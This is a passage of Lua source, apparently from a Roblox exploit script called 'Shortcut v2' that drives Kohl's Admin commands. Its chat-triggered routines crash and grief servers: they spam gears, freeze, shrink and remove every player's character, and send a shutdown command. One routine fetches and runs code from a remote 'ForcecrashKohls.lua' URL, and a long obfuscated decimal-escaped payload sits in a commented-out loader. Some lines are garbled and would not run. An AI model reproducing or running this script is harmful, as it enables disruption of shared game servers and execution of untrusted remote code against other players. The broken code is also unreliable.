                                    L_13_.CFrame = game:GetService("Workspace").Terrain._Game.Workspace.Baseplate.CFrame * CFrame.new(-1 * (game:GetService("Workspace").Terrain._Game.Workspace.Baseplate.Size.X / 2) - (game.Players.LocalPlayer.Character['Torso'].Size.X / 2), 0, 0);wait()
                                    if not L_14_ then
                                        break
                                    end
                                end
                            end)
                            spawn(function()
                                while L_14_ do
                                    game:GetService('RunService').Heartbeat:Wait()
                                    cht("unpunish me "..math.random(1,1000))
                                end
                            end);wait(0.3)
                            L_14_ = false
                        end
                        local L_3_ = math.random(1, 2)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(9999, 6666, 6969));wait(.25)
                        cht("setgrav me -550");wait()
                        cht("gear me 00000000000000000000000000000108158379")
                        L_1_func();wait(.35)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                        local L_4_ = {
                            [1] = Enum.KeyCode.E
                        }
                    
                        game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_4_));wait()
                        repeat wait()
                        until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
                        cht("unfly me");wait(.2)
                        repeat
                            L_2_func()
                    
                        until game.Players.LocalPlayer.Character.Torso:FindFirstChild("Weld");wait()
                    
                        local L_5_ = {
                            [1] = Enum.KeyCode.E
                        }
                    
                        game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_5_))
                        repeat wait()
                        until not game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter")
                    
                        game.Players.LocalPlayer.Character:Destroy()
                        cht("//breakcam");wait()
                        cht("fogend -");wait()
                        cht("flash");wait()
                        cht("music 000000000000000000000000000001838663141");wait()
                        L_1_func();wait(.35)
                        local L_6_ = {
                            [1] = Enum.KeyCode.E
                        }
                    
                        game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_6_))
                        repeat wait()
                        until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1, -498, 1))
                        for L_15_forvar0, L_16_forvar1 in pairs(game:GetService("Workspace").Camera:GetChildren()) do
                            if L_16_forvar1.Name == "FakeCharacter" then
                                L_16_forvar1:Destroy()
                            end
                        end
                        local L_7_ = game:GetService("Workspace").Terrain["_Game"]
                        local L_8_ = L_7_.Workspace
                        local L_9_ = L_7_.Admin
                    end
                    --game.Players.LocalPlayer.Character:Destroy()

                    if msg:lower() == prefix .. "endapocalypse" then
                        cht(":m Apocalypse has ended")
                        cht("fix")
                        cht("music")
                        cht("clr")
                    end
                    if msg:lower() == prefix .. "ivory" then
                        cht("gear me 000000000000000000000000108158379")
                    end
                    if msg:lower() == prefix .. "flood" then
                        cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(10);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(2);cht("refresh me")
		                logn("Stopped giving water crossbows")
                    end
                    if msg:lower() == prefix .. "periastron" then
                        cht(":pm me Tools will be given shortly.")
                        cht("gear me 000000000000000000159229806");wait(1.5)
                        cht("gear me 000000000000000000233520257")
                        cht("gear me 000000000000000000120307951");wait(2.5)
                        cht("gear me 00000000000000000080661504")
                        cht("gear me 00000000000000000093136802");wait(.35)
                        cht("gear me 00000000000000000099119240")
                        cht("gear me 00000000000000000073829193");wait(.65)
                        cht("gear me 000000000000000000139577901")
                        cht("gear me 0000000000000000002544549379");wait(3)
                        cht(":pm me Tools have been given")
                    end

                    -- A portion of the regen finder [findregen2]
                   if msg:lower() == prefix .. "cframelocatereg" then
                        logn("Scanning every possible edgecoord")
            		    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, 1000003, -1000000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1101734, 33651680, -33531784));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, -1000003, -1000000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, -1000000, -3));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(3, -1000000, 1000000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, -3, -1000000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1000000, -3, 1000000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, 3, 1000000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, 1000003, 1000000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, -1000003, 1000000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(454545, 150000, -678678));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(306712, 420552, 398158));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1000000, 1000003, 1000000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1000000, 1000003, -1000000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1000000, -1000003, -1000000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(45400, -49860, 56673));wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(56470, -48312, 28578));wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(75304, -49638, 47300));wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(34120, -48830, 30233));wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(77822, -49751, 79116));wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(42682, -29202, 29886));wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(51052, -49558, 34068));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-200000, 50000, 3500000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(782629, 385179, 234698));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-251773, 1000003, 382563));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-500000, 300000, 500000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-300000, 300000, 300000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(300000, 300000, 300000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(300000, 300000, -300000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-300000, 300000, -300000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-500000, 300000, 500000));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-7, 12009, 95));game:GetService("RunService").RenderStepped:wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(734399, 560502, 2776));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-360263, 421796, 716100));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(999982, 3143, 999997));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(696973, 999997, -1000001));wait(.15)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(100000, 10000, 100000));wait(.35)
                        game.Players.LocalPlayer.Character:Destroy()
                    end
                    if msg:lower() == prefix .. "rej" then
                        game:GetService("TeleportService"):TeleportToPlaceInstance(112420803, game.JobId)
                    end
                    if msg:lower() == prefix .. "rickroll" then
                        cht(":music 6162284078")
                        say("Imagine getting rickrolled lol")
                        say("Anyways join Shortcut v2 today gg/65yHbG4Wfa !---")
                        say("Shortcut v2 is the most powerful script ever!")
                        cht("fogcolor 0 1000 0")
                        cht("fogend nil")
                        cht(":music 6162284078")
                        cht("gear me 94794847")
                        cht("gear me 94794847")
                        cht("gear me 94794847")
                        cht("gear me 94794847")
                        cht("gear me 94794847")
                        cht("gear me 94794847")
                        cht("gear me 94794847")
                        cht("gear me 94794847")
                        wait(1.75)
                        cht("/alltools")
                        wait(1.75)
                        logn("Drop the gears with backspace or else the crash may only be temporarily")
                        cht("respawn all")
                        cht("size all .3")
                        cht("size all .3")
                        cht("size all .3")
                        cht("freeze all")
                        cht("size all 10")
                        cht("size all 10")
                        cht("size all 10")
                        cht("clone all")
                        cht("respawn all")
                        cht("size all .3")
                        cht("size all .3")
                        cht("size all .3")
                        cht("freeze all")
                        cht("size all 10")
                        cht("size all 10")
                        cht("size all 10")
                        cht("clone all")
                        cht("unchar all");wait(25)
                        fuck u lol(
                                (https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/ForcecrashKohls.lua"),
                                true
                            )
                        )()
                        cht("//shutdown")
                    end

                    if msg:lower() == prefix .. "ivory" then
                        cht("gear me 108158379")
                    end
                    if msg:lower() == prefix .. "loadfullbuild" then
                        cht("/toggle antivoid")
                        cht("/permpiss#")
                        cht("/nokpiss");logn("Rejoin before using this \n or else it may be slow and may place stuff incorrectly");logn("Please rejoin")
                        cht("pm me Build loader made by Funzysdeath \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n");wait(4.65)
                        cht("//stop")
                        cht("unchar others others others others,others,others others,others,others others,others,others others,others,others others,others,others others,others,others")
                        cht("/unadmin")
                        cht("/reg");wait(.65)
                        cht("h \n \n \n Loading a Shortcut v2 build project. \n \n \n")
                    --eloadstring("\108\111\99\97\108\32\99\104\101\99\107\101\114\32\61\32\102\97\108\115\101\10\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\116\97\107\101\112\97\114\116\116\111\40\112\97\114\116\116\44\32\99\102\114\97\109\41\10\9\114\101\112\101\97\116\10\9\9\119\97\105\116\40\41\10\9\117\110\116\105\108\32\99\104\101\99\107\101\114\32\61\61\32\102\97\108\115\101\10\9\99\104\101\99\107\101\114\32\61\32\116\114\117\101\10\108\111\99\97\108\32\67\104\97\116\66\97\114\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\80\108\97\121\101\114\71\117\105\46\67\104\97\116\46\70\114\97\109\101\46\67\104\97\116\66\97\114\80\97\114\101\110\116\70\114\97\109\101\46\70\114\97\109\101\46\66\111\120\70\114\97\109\101\46\70\114\97\109\101\46\67\104\97\116\66\97\114\10\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\99\104\97\116\40\116\101\120\116\41\10\32\32\32\32\67\104\97\116\66\97\114\58\83\101\116\84\101\120\116\70\114\111\109\73\110\112\117\116\40\116\101\120\116\41\10\32\32\32\32\103\97\109\101\46\80\108\97\121\101\114\115\58\67\104\97\116\40\116\101\120\116\41\10\32\32\32\32\67\104\97\116\66\97\114\46\84\101\120\116\32\61\32\34\34\10\101\110\100\10\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\114\97\110\100\111\109\115\105\109\40\41\10\9\9\108\111\99\97\108\32\116\97\98\108\101\115\105\109\32\61\32\123\34\124\34\44\32\34\60\34\44\32\34\46\34\44\32\34\62\34\44\32\34\47\34\44\32\34\63\34\44\32\34\59\34\44\32\34\58\34\44\32\34\64\34\44\32\34\39\34\44\32\34\126\34\44\32\34\35\34\44\32\34\93\34\44\32\34\125\34\44\32\34\91\34\44\32\34\123\34\44\32\34\61\34\44\32\34\43\34\44\32\34\45\34\44\32\34\95\34\44\32\34\41\34\44\32\34\40\34\44\32\34\42\34\44\32\34\38\34\44\32\34\94\34\44\32\34\37\34\44\32\34\36\34\44\32\34\33\34\125\10\9\9\114\101\116\117\114\110\32\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\46\46\116\97\98\108\101\115\105\109\91\109\97\116\104\46\114\97\110\100\111\109\40\49\44\32\35\116\97\98\108\101\115\105\109\41\93\10\9\101\110\100\10\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\119\97\105\116\102\111\114\105\118\111\114\121\40\41\10\9\9\114\101\112\101\97\116\10\9\9\9\105\102\32\110\111\116\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\87\111\114\107\115\112\97\99\101\34\41\46\84\101\114\114\97\105\110\91\34\95\71\97\109\101\34\93\46\65\100\109\105\110\46\80\97\100\115\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\78\97\109\101\32\46\46\32\34\39\115\32\97\100\109\105\110\34\41\32\116\104\101\110\10\9\9\9\9\105\102\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\87\111\114\107\115\112\97\99\101\34\41\46\84\101\114\114\97\105\110\91\34\95\71\97\109\101\34\93\46\65\100\109\105\110\46\80\97\100\115\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\84\111\117\99\104\32\116\111\32\103\101\116\32\97\100\109\105\110\34\41\32\116\104\101\110\10\9\9\9\9\9\108\111\99\97\108\32\112\97\100\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\87\111\114\107\115\112\97\99\101\34\41\46\84\101\114\114\97\105\110\91\34\95\71\97\109\101\34\93\46\65\100\109\105\110\46\80\97\100\115\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\84\111\117\99\104\32\116\111\32\103\101\116\32\97\100\109\105\110\34\41\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\72\101\97\100\34\41\10\9\9\9\9\9\108\111\99\97\108\32\104\101\97\100\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\76\101\102\116\32\76\101\103\34\41\10\9\9\9\9\9\102\105\114\101\116\111\117\99\104\105\110\116\101\114\101\115\116\40\112\97\100\44\32\104\101\97\100\44\32\49\41\10\9\9\9\9\9\102\105\114\101\116\111\117\99\104\105\110\116\101\114\101\115\116\40\112\97\100\44\32\104\101\97\100\44\32\48\41\10\9\9\9\9\101\108\115\101\10\9\9\9\9\9\114\101\103\101\110\40\41\10\9\9\9\9\101\110\100\10\9\9\9\101\110\100\10\9\9\9\119\97\105\116\40\41\10\9\9\9\105\102\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\66\97\99\107\112\97\99\107\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\73\118\111\114\121\80\101\114\105\97\115\116\114\111\110\34\41\32\116\104\101\110\10\9\9\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\58\69\113\117\105\112\84\111\111\108\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\66\97\99\107\112\97\99\107\46\73\118\111\114\121\80\101\114\105\97\115\116\114\111\110\41\10\9\9\9\101\110\100\10\9\9\9\105\102\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\73\118\111\114\121\80\101\114\105\97\115\116\114\111\110\34\41\32\116\104\101\110\10\10\9\9\9\101\108\115\101\10\9\9\9\9\99\104\97\116\40\34\103\101\97\114\32\109\101\32\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\49\48\56\49\53\56\51\55\57\34\41\10\9\9\9\9\119\97\105\116\40\46\50\41\10\9\9\9\101\110\100\10\9\9\9\119\97\105\116\40\41\10\9\9\117\110\116\105\108\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\73\118\111\114\121\80\101\114\105\97\115\116\114\111\110\34\41\10\9\9\119\97\105\116\40\46\49\41\10\9\101\110\100\10\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\87\111\114\107\115\112\97\99\101\34\41\46\70\97\108\108\101\110\80\97\114\116\115\68\101\115\116\114\111\121\72\101\105\103\104\116\32\61\32\34\110\97\110\34\10\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\99\108\105\99\107\105\118\40\41\10\9\9\108\111\99\97\108\32\105\118\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\73\118\111\114\121\80\101\114\105\97\115\116\114\111\110\34\41\10\9\9\114\101\112\101\97\116\10\9\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\72\101\97\114\116\98\101\97\116\58\119\97\105\116\40\41\10\9\9\117\110\116\105\108\32\105\118\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\82\101\109\111\116\101\34\41\10\9\9\108\111\99\97\108\32\82\101\109\111\116\101\32\61\32\105\118\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\82\101\109\111\116\101\34\41\10\9\9\82\101\109\111\116\101\58\70\105\114\101\83\101\114\118\101\114\40\69\110\117\109\46\75\101\121\67\111\100\101\46\69\41\10\9\101\110\100\10\10\9\108\111\99\97\108\32\112\97\114\116\32\61\32\112\97\114\116\116\10\9\108\111\99\97\108\32\112\111\115\105\116\105\111\110\32\61\32\99\102\114\97\109\10\9\108\111\99\97\108\32\115\112\111\115\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\118\32\126\61\32\112\97\114\116\32\97\110\100\32\118\58\73\115\65\40\34\80\97\114\116\34\41\32\116\104\101\110\10\9\9\9\118\46\67\97\110\67\111\108\108\105\100\101\32\61\32\102\97\108\115\101\10\9\9\101\110\100\10\9\101\110\100\10\9\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\71\114\97\118\105\116\121\32\61\32\48\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\65\110\99\104\111\114\101\100\32\61\32\116\114\117\101\10\9\119\97\105\116\40\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\65\110\99\104\111\114\101\100\32\61\32\102\97\108\115\101\10\9\119\97\105\116\40\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\112\111\115\105\116\105\111\110\10\9\119\97\105\116\40\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\112\111\115\105\116\105\111\110\10\9\119\97\105\116\40\41\10\9\119\97\105\116\102\111\114\105\118\111\114\121\40\41\10\9\99\104\97\116\40\34\105\110\118\105\115\32\109\101\32\102\117\110\32\122\121\105\115\119\101\105\114\100\34\46\46\114\97\110\100\111\109\115\105\109\40\41\41\10\9\119\97\105\116\40\41\10\9\108\111\99\97\108\32\116\101\109\112\116\105\110\103\32\61\32\116\114\117\101\10\9\115\112\97\119\110\40\102\117\110\99\116\105\111\110\40\41\10\9\9\119\104\105\108\101\32\116\101\109\112\116\105\110\103\32\61\61\32\116\114\117\101\32\100\111\10\9\9\9\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\71\114\97\118\105\116\121\32\61\32\48\10\9\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\112\111\115\105\116\105\111\110\10\9\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\72\101\97\114\116\98\101\97\116\58\119\97\105\116\40\41\10\9\9\101\110\100\10\9\101\110\100\41\10\9\119\97\105\116\40\46\49\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\65\110\99\104\111\114\101\100\32\61\32\116\114\117\101\10\9\119\97\105\116\40\46\49\41\10\9\116\101\109\112\116\105\110\103\32\61\32\102\97\108\115\101\10\9\119\97\105\116\40\46\51\53\41\10\9\99\108\105\99\107\105\118\40\41\10\9\119\97\105\116\40\46\51\53\41\10\9\114\101\112\101\97\116\10\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\72\101\97\114\116\98\101\97\116\58\119\97\105\116\40\41\10\9\117\110\116\105\108\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\67\97\109\101\114\97\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\70\97\107\101\67\104\97\114\97\99\116\101\114\34\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\65\110\99\104\111\114\101\100\32\61\32\102\97\108\115\101\10\9\108\111\99\97\108\32\109\101\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\10\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\109\111\118\101\112\97\114\116\40\41\10\9\9\105\102\32\109\101\46\67\104\97\114\97\99\116\101\114\32\116\104\101\110\10\9\9\9\105\102\32\109\101\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\34\41\32\116\104\101\110\10\9\9\9\9\108\111\99\97\108\32\99\102\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\10\9\9\9\9\108\111\99\97\108\32\108\111\111\112\105\110\103\32\61\32\116\114\117\101\10\9\9\9\9\115\112\97\119\110\40\102\117\110\99\116\105\111\110\40\41\10\9\9\9\9\9\119\104\105\108\101\32\116\114\117\101\32\100\111\10\9\9\9\9\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\82\117\110\83\101\114\118\105\99\101\39\41\46\72\101\97\114\116\98\101\97\116\58\87\97\105\116\40\41\10\9\9\9\9\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\91\39\72\117\109\97\110\111\105\100\39\93\58\67\104\97\110\103\101\83\116\97\116\101\40\49\49\41\10\9\9\9\9\9\9\99\102\46\67\70\114\97\109\101\32\61\32\112\97\114\116\46\67\70\114\97\109\101\32\42\32\67\70\114\97\109\101\46\110\101\119\40\45\49\42\40\112\97\114\116\46\83\105\122\101\46\88\47\50\41\45\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\91\39\84\111\114\115\111\39\93\46\83\105\122\101\46\88\47\50\41\44\32\48\44\32\48\41\10\9\9\9\9\9\9\105\102\32\110\111\116\32\108\111\111\112\105\110\103\32\116\104\101\110\32\98\114\101\97\107\32\101\110\100\10\9\9\9\9\9\101\110\100\10\9\9\9\9\101\110\100\41\10\9\9\9\9\115\112\97\119\110\40\102\117\110\99\116\105\111\110\40\41\32\119\104\105\108\101\32\108\111\111\112\105\110\103\32\100\111\32\119\97\105\116\40\46\49\41\32\99\104\97\116\40\34\117\110\112\117\110\105\115\104\32\109\101\32\34\46\46\114\97\110\100\111\109\115\105\109\40\41\41\32\101\110\100\32\101\110\100\41\10\9\9\9\9\119\97\105\116\40\48\46\50\53\41\10\9\9\9\9\108\111\111\112\105\110\103\32\61\32\102\97\108\115\101\10\9\9\9\101\110\100\10\9\9\101\110\100\10\9\101\110\100\10\9\114\101\112\101\97\116\10\9\9\109\111\118\101\112\97\114\116\40\41\10\9\117\110\116\105\108\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\84\111\114\115\111\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\87\101\108\100\34\41\10\9\119\97\105\116\40\41\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\84\111\114\115\111\58\71\101\116\67\104\105\108\100\114\101\110\40\41\41\32\100\111\10\9\9\105\102\32\118\58\73\115\65\40\34\87\101\108\100\34\41\32\97\110\100\32\118\46\80\97\114\116\49\32\126\61\32\112\97\114\116\32\116\104\101\110\10\9\9\9\118\58\68\101\115\116\114\111\121\40\41\10\9\9\101\110\100\10\9\101\110\100\10\9\119\97\105\116\40\41\10\9\99\108\105\99\107\105\118\40\41\10\9\114\101\112\101\97\116\10\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\72\101\97\114\116\98\101\97\116\58\119\97\105\116\40\41\10\9\117\110\116\105\108\32\103\97\109\101\46\119\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\80\117\108\115\101\34\41\10\9\99\104\97\116\40\34\114\101\115\112\97\119\110\32\109\101\32\34\46\46\114\97\110\100\111\109\